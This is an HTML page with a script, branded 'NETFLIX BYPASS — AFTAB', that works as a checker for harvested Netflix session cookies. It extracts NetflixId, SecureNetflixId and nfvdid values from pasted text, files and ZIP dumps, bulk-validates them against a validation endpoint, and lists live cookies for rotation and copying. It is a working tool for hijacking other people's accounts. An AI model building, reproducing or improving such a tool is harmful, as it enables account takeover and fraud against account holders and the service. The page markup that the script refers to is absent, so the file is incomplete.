<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NETFLIX BYPASS — AFTAB</title>
<style>
:root{
  --cy:#00f0ff;
  --mg:#ff2bd6;
  --bg:#05060a;
  --panel:#0a0c14;
  --line:rgba(0,240,255,.25);
  --mgl:rgba(255,43,214,.25);
  --dim:#7a8399;
  --nf:#e50914;
}
*{box-sizing:border-box}
html,body{margin:0;padding:0;background:var(--bg);color:#e8f6ff;font-family:"SF Mono",ui-monospace,Menlo,Consolas,monospace;min-height:100vh}
body::before{
  content:"";position:fixed;inset:0;pointer-events:none;z-index:1;
  background:repeating-linear-gradient(0deg,rgba(0,240,255,.035) 0 1px,transparent 1px 3px);
  mix-blend-mode:screen;
}
body::after{
  content:"";position:fixed;inset:-50%;pointer-events:none;z-index:0;
  background:
    radial-gradient(circle at 20% 10%,rgba(0,240,255,.10),transparent 45%),
    radial-gradient(circle at 85% 90%,rgba(255,43,214,.10),transparent 45%);
}

/* ================= NETFLIX INTRO ================= */
#intro{
  position:fixed;inset:0;z-index:9999;background:#000;
  display:flex;align-items:center;justify-content:center;flex-direction:column;
  transition:opacity .7s ease,visibility .7s ease;
  overflow:hidden;
}
#intro.gone{opacity:0;visibility:hidden;pointer-events:none}

.nf-stage{
  position:relative;display:flex;flex-direction:column;align-items:center;
  perspective:900px;
}
.nf-N{
  font-family:"Arial Black","Helvetica Neue",Arial,sans-serif;
  font-weight:900;
  font-size:clamp(110px,32vw,240px);
  line-height:.8;
  letter-spacing:-.05em;
  color:var(--nf);
  position:relative;
  transform:scale(.2) rotateY(90deg);
  opacity:0;
  filter:blur(20px) brightness(.4);
  text-shadow:
    0 0 20px rgba(229,9,20,.9),
    0 0 60px rgba(229,9,20,.7),
    0 0 120px rgba(229,9,20,.45);
  animation:nfReveal 1.15s cubic-bezier(.16,1,.3,1) .25s forwards;
}
.nf-N::before,
.nf-N::after{
  content:"N";
  position:absolute;inset:0;
  font-family:inherit;font-weight:inherit;font-size:inherit;letter-spacing:inherit;line-height:inherit;
  pointer-events:none;
}
.nf-N::before{
  color:rgba(255,60,80,.55);
  filter:blur(18px);
  animation:ghostA 1.2s ease .3s forwards;
  opacity:0;
}
.nf-N::after{
  color:rgba(255,255,255,.35);
  filter:blur(40px);
  animation:ghostB 1.4s ease .4s forwards;
  opacity:0;
}

.nf-word{
  margin-top:6px;
  font-family:"Arial Black","Helvetica Neue",Arial,sans-serif;
  font-weight:900;
  font-size:clamp(20px,6vw,42px);
  letter-spacing:.55em;
  color:var(--nf);
  text-shadow:0 0 18px rgba(229,9,20,.85),0 0 44px rgba(229,9,20,.5);
  opacity:0;
  transform:translateY(14px) scale(.9);
  animation:nfWord 1s cubic-bezier(.2,.9,.2,1) 1.25s forwards;
  padding-left:.55em;
}

.nf-sweep{
  position:absolute;inset:-40% -10%;
  background:linear-gradient(105deg,transparent 42%,rgba(255,255,255,.55) 50%,transparent 58%);
  mix-blend-mode:overlay;pointer-events:none;
  opacity:0;
  animation:nfSweep 1.1s ease 1.35s forwards;
}

.nf-fade{
  position:absolute;inset:0;background:radial-gradient(circle at center,transparent 30%,#000 90%);
  pointer-events:none;z-index:-1;
}

@keyframes nfReveal{
  0%{opacity:0;transform:scale(.2) rotateY(90deg);filter:blur(20px) brightness(.4)}
  55%{opacity:1;filter:blur(3px) brightness(1.35)}
  100%{opacity:1;transform:scale(1) rotateY(0deg);filter:blur(0) brightness(1)}
}
@keyframes ghostA{
  0%{opacity:0;transform:scale(.9)}
  60%{opacity:1;transform:scale(1.08)}
  100%{opacity:0;transform:scale(1.25)}
}
@keyframes ghostB{
  0%{opacity:0;transform:scale(.7)}
  50%{opacity:.9;transform:scale(1.15)}
  100%{opacity:0;transform:scale(1.5)}
}
@keyframes nfWord{
  to{opacity:1;transform:translateY(0) scale(1)}
}
@keyframes nfSweep{
  0%{opacity:0;transform:translateX(-30%)}
  30%{opacity:.9}
  100%{opacity:0;transform:translateX(30%)}
}

/* ================= SHELL ================= */
.wrap{
  position:relative;z-index:2;max-width:520px;margin:0 auto;
  padding:22px 16px 60px;opacity:0;transform:translateY(10px);
  transition:opacity .5s ease,transform .5s ease;
}
.wrap.live{opacity:1;transform:none}

.head{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px}
.head h1{
  margin:0;font-size:17px;letter-spacing:.18em;font-weight:800;
  color:#fff;text-shadow:0 0 14px var(--cy),0 0 30px rgba(0,240,255,.5)
}
.head .sub{font-size:10px;color:var(--mg);letter-spacing:.3em;margin-top:4px}
.pill{
  border:1px solid var(--cy);color:var(--cy);font-size:10px;letter-spacing:.25em;
  padding:5px 12px;border-radius:999px;background:rgba(0,240,255,.06);
  box-shadow:0 0 14px rgba(0,240,255,.25)
}

.panel{
  position:relative;background:linear-gradient(180deg,rgba(10,12,20,.92),rgba(10,12,20,.75));
  border:1px solid var(--line);border-radius:14px;padding:16px;margin-bottom:14px;
  backdrop-filter:blur(6px);
  box-shadow:0 0 0 1px rgba(255,43,214,.05) inset,0 12px 40px rgba(0,0,0,.6);
}
.panel::before{
  content:"";position:absolute;inset:0;border-radius:14px;pointer-events:none;
  background:linear-gradient(135deg,rgba(0,240,255,.06),transparent 40%,rgba(255,43,214,.06))
}
.panel h2{
  margin:0 0 12px;font-size:11px;letter-spacing:.3em;color:var(--mg);font-weight:700;
  display:flex;align-items:center;gap:8px
}
.panel h2::before{content:"";width:6px;height:6px;background:var(--mg);box-shadow:0 0 10px var(--mg);border-radius:50%}

textarea{
  width:100%;height:86px;background:#04050a;color:#d6faff;
  border:1px solid var(--line);border-radius:10px;padding:11px;
  font-family:inherit;font-size:12px;resize:vertical;outline:none;
  transition:border-color .2s,box-shadow .2s
}
textarea:focus{border-color:var(--cy);box-shadow:0 0 0 3px rgba(0,240,255,.10),0 0 20px rgba(0,240,255,.2)}
textarea::placeholder{color:#42506a}

button{
  width:100%;border:none;border-radius:10px;padding:12px 14px;margin-top:9px;
  font-family:inherit;font-size:12px;font-weight:800;letter-spacing:.18em;
  cursor:pointer;color:#04050a;background:var(--cy);
  box-shadow:0 0 18px rgba(0,240,255,.35);transition:transform .12s,box-shadow .2s,filter .2s
}
button:hover{transform:translateY(-1px);box-shadow:0 0 26px rgba(0,240,255,.55)}
button:active{transform:translateY(0)}
button.mg{background:var(--mg);color:#fff;box-shadow:0 0 18px rgba(255,43,214,.45)}
button.mg:hover{box-shadow:0 0 28px rgba(255,43,214,.7)}
button.ghost{background:transparent;color:var(--cy);border:1px solid var(--cy);box-shadow:none}
button.ghost.mg{color:var(--mg);border-color:var(--mg)}
button.danger{background:#ff2d55;color:#fff;box-shadow:0 0 18px rgba(255,45,85,.4)}
button:disabled{opacity:.35;cursor:not-allowed;transform:none;box-shadow:none}

.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.grid2 button{margin-top:0}

.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
.stat{
  border:1px solid var(--line);border-radius:12px;padding:12px;text-align:center;
  background:linear-gradient(180deg,rgba(0,240,255,.05),transparent)
}
.stat .k{font-size:9px;letter-spacing:.3em;color:var(--dim)}
.stat .v{font-size:22px;font-weight:900;margin-top:4px;color:var(--cy);text-shadow:0 0 14px rgba(0,240,255,.6)}
.stat.bad .v{color:var(--mg);text-shadow:0 0 14px rgba(255,43,214,.6)}

#status{margin-top:10px;font-size:12px;font-weight:700;letter-spacing:.05em;padding:11px;border-radius:10px;display:none;text-align:center}
#status.ok{display:block;background:rgba(0,240,255,.08);border:1px solid var(--cy);color:var(--cy);box-shadow:0 0 20px rgba(0,240,255,.25)}
#status.bad{display:block;background:rgba(255,43,214,.08);border:1px solid var(--mg);color:var(--mg);box-shadow:0 0 20px rgba(255,43,214,.25)}
#status.wait{display:block;background:rgba(255,214,0,.06);border:1px solid #ffd600;color:#ffd600}

.upload{position:relative;overflow:hidden;display:block}
.upload input{position:absolute;inset:0;opacity:0;cursor:pointer;width:100%;height:100%}

.loader{display:none;text-align:center;font-size:11px;color:var(--cy);letter-spacing:.15em;padding:10px 0}
.loader.on{display:block;animation:blink 1s steps(2) infinite}
@keyframes blink{50%{opacity:.45}}
.progress{display:none;height:8px;background:#04050a;border:1px solid var(--line);border-radius:999px;overflow:hidden;margin:6px 0}
.progress.on{display:block}
.bar{height:100%;width:0;background:linear-gradient(90deg,var(--cy),var(--mg));transition:width .2s;box-shadow:0 0 14px var(--cy)}
.ptext{font-size:10px;color:var(--dim);text-align:center;letter-spacing:.15em}

.rotate{display:none;border:1px solid var(--mgl);border-radius:12px;padding:14px;margin-bottom:14px;background:linear-gradient(180deg,rgba(255,43,214,.05),transparent)}
.rotate.on{display:block}
.rcount{text-align:center;font-size:14px;font-weight:900;color:#fff;letter-spacing:.2em}
.rprof{text-align:center;font-size:10px;color:var(--cy);letter-spacing:.15em;margin:6px 0;word-break:break-all}
.rcookie{background:#04050a;border:1px solid var(--line);border-radius:8px;padding:9px;font-size:9px;word-break:break-all;max-height:84px;overflow-y:auto;color:#9fe9ff;margin:8px 0}

.modal{display:none;position:fixed;inset:0;background:rgba(2,3,7,.92);backdrop-filter:blur(4px);z-index:500;overflow-y:auto;padding:20px}
.modal.on{display:block}
.modal-in{max-width:480px;margin:40px auto;background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:20px;box-shadow:0 0 40px rgba(0,240,255,.2)}
.modal-in h3{margin:0 0 14px;color:var(--mg);font-size:13px;letter-spacing:.3em;text-align:center}
.hitem{border:1px solid var(--line);border-radius:10px;padding:9px;margin-bottom:8px;font-size:10px;color:#b7c6dd}
.hitem .t{color:var(--cy);display:block;margin-bottom:3px;letter-spacing:.1em}

.clock{font-size:10px;color:var(--dim);letter-spacing:.25em;text-align:center;margin-bottom:14px}

/* ================= MADE BY AFTAB + TG ================= */
.made{text-align:center;margin-top:30px;display:flex;flex-direction:column;align-items:center;gap:14px}
.made-badge{
  display:inline-block;
  color:#04050a;
  background:linear-gradient(90deg,var(--cy),var(--mg));
  padding:11px 26px;
  border-radius:999px;
  font-size:12px;
  font-weight:900;

}
.made-badge::before{
  content:"";
  position:absolute;inset:-6px;border-radius:999px;
  background:linear-gradient(90deg,var(--cy),var(--mg));
  filter:blur(14px);opacity:.55;z-index:-1;
}
@keyframes makerPulse{
  0%,100%{transform:scale(1);box-shadow:0 0 22px rgba(0,240,255,.6),0 0 44px rgba(255,43,214,.4)}
  50%{transform:scale(1.035);box-shadow:0 0 32px rgba(0,240,255,.85),0 0 60px rgba(255,43,214,.65)}
}
.tg-card{
  display:inline-flex;align-items:center;gap:10px;
  border:1px solid rgba(0,240,255,.35);
  background:linear-gradient(180deg,rgba(0,240,255,.06),rgba(255,43,214,.04));
  padding:9px 16px;border-radius:999px;
  box-shadow:0 0 18px rgba(0,240,255,.25);
  text-decoration:none;
  transition:transform .15s,box-shadow .2s,border-color .2s;
}
.tg-card:hover{transform:translateY(-1px);border-color:var(--cy);box-shadow:0 0 26px rgba(0,240,255,.5)}
.tg-card svg{width:20px;height:20px;display:block;filter:drop-shadow(0 0 6px rgba(0,240,255,.8))}
.tg-handle{
  font-size:12px;font-weight:800;letter-spacing:.15em;
  background:linear-gradient(90deg,var(--cy),var(--mg));
  -webkit-background-clip:text;background-clip:text;color:transparent;
}

.hist-item{
  border:1px solid var(--line);border-radius:10px;padding:10px;margin-bottom:8px;
  font-size:10px;color:#b7c6dd;cursor:pointer;transition:border-color .2s,background .2s;
  position:relative;
}
.hist-item:hover{border-color:var(--cy);background:rgba(0,240,255,.05)}
.hist-item .t{color:var(--cy);display:block;margin-bottom:4px;letter-spacing:.1em}
.hist-item .meta{color:var(--dim);font-size:9px}
.hist-item .ck{
  margin-top:6px;background:#04050a;border:1px solid var(--line);border-radius:6px;
  padding:6px;font-size:9px;word-break:break-all;color:#9fe9ff;max-height:44px;overflow:hidden;
}
.hist-item .tag{
  position:absolute;top:8px;right:8px;font-size:8px;letter-spacing:.2em;
  padding:3px 8px;border-radius:999px;font-weight:800;
}
.tag.ok{background:rgba(0,240,255,.12);color:var(--cy);border:1px solid var(--cy)}
.tag.bad{background:rgba(255,43,214,.12);color:var(--mg);border:1px solid var(--mg)}
.hist-empty{color:#42506a;text-align:center;padding:24px;font-size:11px;letter-spacing:.2em}
</style>
</head>

<script>

/* ================= STATE ================= */
var validCookies=[];
var invalidCookies=[];
var lastValidCookie='';
var allChunks=[];
var rotIndex=0;

/* ================= CLOCK ================= */
function setClock(){document.getElementById('clock').textContent='CORE: BYPASS // '+new Date().toLocaleTimeString('en-US',{hour12:false})}
setInterval(setClock,1000);setClock();

/* ================= COOKIE EXTRACTOR ================= */
function extract(raw){
  if(!raw) return '';
  var keep=['netflixid','securenetflixid','nfvdid'];
  var out={};
  var lines=raw.split('\n');
  for(var i=0;i<lines.length;i++){
    var line=lines[i];
    if(!line.trim()) continue;
    if(line.charAt(0)==='#') continue;
    var cells=line.split('\t');
    if(cells.length>=7){
      var nm=cells[5]?cells[5].trim():'';
      var val=cells.slice(6).join('\t').trim();
      var low=nm.toLowerCase();
      if(keep.indexOf(low)>=0 && val) out[low]=nm+'='+val;
    }
  }
  if(Object.keys(out).length===0){
    var parts=raw.split(/[;\n]/);
    for(var j=0;j<parts.length;j++){
      var p=parts[j].trim();
      if(!p) continue;
      var eq=p.indexOf('=');
      if(eq<0) continue;
      var k=p.substring(0,eq).trim().toLowerCase();
      var v=p.substring(eq+1).trim();
      if(keep.indexOf(k)>=0 && v) out[k]=p.substring(0,eq).trim()+'='+v;
    }
  }
  if(Object.keys(out).length===0){
    try{
      var obj=JSON.parse(raw);
      if(Array.isArray(obj)){
        for(var m=0;m<obj.length;m++){
          var c=obj[m];
          if(c&&c.name&&c.value&&keep.indexOf(String(c.name).toLowerCase())>=0)
            out[String(c.name).toLowerCase()]=c.name+'='+c.value;
        }
      }else if(obj&&typeof obj==='object'){
        for(var key in obj){
          if(keep.indexOf(key.toLowerCase())>=0 && obj[key]) out[key.toLowerCase()]=key+'='+obj[key];
        }
      }
    }catch(e){}
  }
  var arr=[];
  if(out['netflixid']) arr.push(out['netflixid']);
  if(out['securenetflixid']) arr.push(out['securenetflixid']);
  if(out['nfvdid']) arr.push(out['nfvdid']);
  return arr.join('; ');
}

function splitGroups(text){
  var t=text.trim();
  if(t.charAt(0)==='[' || t.charAt(0)==='{'){
    try{ JSON.parse(t); return [t]; }catch(e){}
  }
  var lines=text.split('\n').map(function(l){return l.replace(/\r$/,'')});
  var groups=[],cur=[],mode=null;
  function flush(){ if(cur.length){groups.push(cur.join('\n'));cur=[]} }
  for(var i=0;i<lines.length;i++){
    var line=lines[i];
    if(!line.trim()){ if(mode!=='table') flush(); continue; }
    if(line.charAt(0)==='#'&&line.charAt(1)===' ') continue;
    var cells=line.split('\t');
    if(cells.length>=7){
      var name=cells[5]?cells[5].trim().toLowerCase():'';
      var known=name&&(name==='netflixid'||name==='securenetflixid'||name==='nfvdid'||name.indexOf('netflix')===0);
      if(mode==='string'){ flush(); }
      mode='table';
      var hasBoth=cur.some(function(x){var cc=x.split('\t');if(cc.length<6)return false;var n=cc[5].toLowerCase();return n==='netflixid'||n==='securenetflixid'});
      if(hasBoth&&known){ flush(); }
      cur.push(line);
    }else{
      if(mode==='table'){ flush(); }
      mode='string';
      cur.push(line);
    }
  }
  flush();
  return groups;
}

/* ================= VALIDATE ================= */
async function validate(cookie){
  try{
    var res=await fetch('/api/validate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookie:cookie,device:'mobile'})});
    var data=await res.json();
    return data.ok?{ok:true,profile:data.profile||'?'}:{ok:false,error:data.error||'?'};
  }catch(e){ return {ok:false,error:e.message} }
}

/* ================= SINGLE CHECK ================= */
async function checkSingle(){
  var input=document.getElementById('singleInput').value.trim();
  var status=document.getElementById('status');
  if(!input){status.className='bad';status.textContent='enter cookie';return}
  var norm=extract(input);
  if(!norm){status.className='bad';status.textContent='no netflix keys found';return}
  status.className='wait';status.textContent='checking...';
  var r=await validate(norm);
  if(r.ok){
    lastValidCookie=norm;
    validCookies=[{cookie:norm,profile:r.profile}];
    invalidCookies=[];
    rotIndex=0;
    status.className='ok';status.textContent='LIVE — '+r.profile;
    document.getElementById('validCount').textContent='1';
    document.getElementById('invalidCount').textContent='0';
    showRotate();
    saveHistory({time:Date.now(),src:'single',valid:true,cookie:norm,profile:r.profile,error:''});
  }else{
    status.className='bad';status.textContent='DEAD — '+r.error;
    saveHistory({time:Date.now(),src:'single',valid:false,cookie:norm,profile:'',error:r.error});
  }
}

/* ================= FILE READ ================= */
async function readFileContent(file){
  if(file.name.toLowerCase().endsWith('.pdf')){
    var buf=await file.arrayBuffer();
    var pdf=await pdfjsLib.getDocument({data:buf}).promise;
    var full='';
    for(var p=1;p<=pdf.numPages;p++){
      var page=await pdf.getPage(p);
      var c=await page.getTextContent();
      full+=c.items.map(function(it){return it.str}).join('\n')+'\n';
    }
    return full;
  }
  return await file.text();
}

/* ================= BULK UPLOAD ================= */
async function uploadFile(event){
  var files=event.target.files;
  if(!files.length) return;
  var loader=document.getElementById('loader');
  var progress=document.getElementById('progress');
  var progressBar=document.getElementById('progressBar');
  var progressText=document.getElementById('progressText');
  loader.classList.add('on');
  progress.classList.add('on');

  allChunks=[];

  for(var f=0;f<files.length;f++){
    var file=files[f];
    loader.textContent='reading: '+file.name+' ('+(f+1)+'/'+files.length+')';

    try{
      if(file.name.toLowerCase().endsWith('.zip')){
        var buf=await file.arrayBuffer();
        var zip=await JSZip.loadAsync(buf);
        var names=Object.keys(zip.files);
        for(var n=0;n<names.length;n++){
          var entry=zip.files[names[n]];
          if(entry.dir) continue;
          var lname=names[n].toLowerCase();
          if(lname.endsWith('.txt')||lname.endsWith('.json')||lname.endsWith('.csv')){
            var content=await entry.async('text');
            var groups=splitGroups(content);
            for(var g=0;g<groups.length;g++) allChunks.push(groups[g]);
          }
        }
      }else{
        var text=await readFileContent(file);
        var gs=splitGroups(text);
        for(var gg=0;gg<gs.length;gg++) allChunks.push(gs[gg]);
      }
    }catch(e){
      console.log('file error: '+file.name+' — '+e.message);
    }
  }

  var unique={};
  var finalChunks=[];
  for(var i=0;i<allChunks.length;i++){
    var norm=extract(allChunks[i]);
    if(!norm) continue;
    if(unique[norm]) continue;
    unique[norm]=true;
    finalChunks.push(norm);
  }

  loader.textContent='validating '+finalChunks.length+' cookies...';
  validCookies=[];invalidCookies=[];

  var batchSize=5;
  for(var b=0;b<finalChunks.length;b+=batchSize){
    var batch=finalChunks.slice(b,b+batchSize);
    var results=await Promise.all(batch.map(function(c){return validate(c)}));
    for(var r=0;r<results.length;r++){
      if(results[r].ok){
        validCookies.push({cookie:batch[r],profile:results[r].profile});
        saveHistory({time:Date.now(),src:'bulk',valid:true,cookie:batch[r],profile:results[r].profile,error:''});
      }else{
        invalidCookies.push({cookie:batch[r],error:results[r].error});
        saveHistory({time:Date.now(),src:'bulk',valid:false,cookie:batch[r],profile:'',error:results[r].error});
      }
    }
    var done=Math.min(b+batchSize,finalChunks.length);
    var pct=Math.round((done/finalChunks.length)*100);
    progressBar.style.width=pct+'%';
    progressText.textContent='scanned '+done+'/'+finalChunks.length+' — '+validCookies.length+' valid';
  }

  loader.classList.remove('on');
  progress.classList.remove('on');
  document.getElementById('validCount').textContent=validCookies.length;
  document.getElementById('invalidCount').textContent=invalidCookies.length;
  if(validCookies.length>0){
    lastValidCookie=validCookies[0].cookie;
    rotIndex=0;
    showRotate();
  }
}

/* ================= ROTATION ================= */
function showRotate(){
  var box=document.getElementById('rotateBox');
  if(!validCookies.length){box.classList.remove('on');return}
  box.classList.add('on');
  updateRotate();
}

function updateRotate(){
  if(!validCookies.length) return;
  var c=validCookies[rotIndex];
  document.getElementById('rotCurrent').textContent=(rotIndex+1);
  document.getElementById('rotTotal').textContent=validCookies.length;
  document.getElementById('rotProfile').textContent=c.profile||'?';
  document.getElementById('rotCookie').textContent=c.cookie;
  lastValidCookie=c.cookie;
}

function nextCookie(){
  if(!validCookies.length) return;
  rotIndex=(rotIndex+1)%validCookies.length;
  updateRotate();
}

function prevCookie(){
  if(!validCookies.length) return;
  rotIndex=(rotIndex-1+validCookies.length)%validCookies.length;
  updateRotate();
}

function copyCurrent(){
  if(!validCookies.length) return;
  var c=validCookies[rotIndex].cookie;
  if(navigator.clipboard){
    navigator.clipboard.writeText(c).then(function(){alert('cookie #'+(rotIndex+1)+' copied')}).catch(function(){alert(c)});
  }else{
    alert(c);
  }
}

/* ================= HISTORY ================= */
var HIST_KEY='nf_hist_v2';

function loadHistory(){
  try{return JSON.parse(localStorage.getItem(HIST_KEY)||'[]')}catch(e){return[]}
}
function saveHistory(entry){
  var h=loadHistory();
  h.unshift(entry);
  if(h.length>200) h=h.slice(0,200);
  localStorage.setItem(HIST_KEY,JSON.stringify(h));
}
function clearHistory(){
  if(!confirm('clear all history?')) return;
  localStorage.removeItem(HIST_KEY);
  renderHistory();
}
function escapeHtml(s){
  return String(s||'').replace(/[&<>"']/g,function(c){
    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
  });
}
function renderHistory(){
  var list=document.getElementById('historyList');
  var h=loadHistory();
  if(!h.length){list.innerHTML='<div class="hist-empty">NO HISTORY</div>';return}
  var html='';
  for(var i=0;i<h.length;i++){
    var e=h[i];
    var dt=new Date(e.time).toLocaleString();
    var tag=e.valid?'<span class="tag ok">LIVE</span>':'<span class="tag bad">DEAD</span>';
    var prof=e.profile?('profile: '+escapeHtml(e.profile)):('err: '+escapeHtml(e.error||'?'));
    html+='<div class="hist-item" data-idx="'+i+'" onclick="openHistoryItem('+i+')">'+
      tag+
      '<span class="t">'+escapeHtml(dt)+'</span>'+
      '<div class="meta">src: '+escapeHtml(e.src)+' · '+prof+'</div>'+
      '<div class="ck">'+escapeHtml(e.cookie)+'</div>'+
    '</div>';
  }
  list.innerHTML=html;
}
function openHistoryItem(idx){
  var h=loadHistory();
  var e=h[idx];
  if(!e) return;
  var input=document.getElementById('singleInput');
  input.value=e.cookie;
  hideHistory();
  if(e.valid){
    lastValidCookie=e.cookie;
    validCookies=[{cookie:e.cookie,profile:e.profile||'?'}];
    invalidCookies=[];
    rotIndex=0;
    document.getElementById('validCount').textContent='1';
    document.getElementById('invalidCount').textContent='0';
    var st=document.getElementById('status');
    st.className='ok';st.textContent='LIVE — '+(e.profile||'?');
    showRotate();
  }else{
    var st2=document.getElementById('status');
    st2.className='bad';st2.textContent='DEAD — '+(e.error||'?');
  }
  window.scrollTo({top:0,behavior:'smooth'});
}
function showHistory(){
  renderHistory();
  document.getElementById('historyModal').classList.add('on');
}
function hideHistory(){document.getElementById('historyModal').classList.remove('on')}
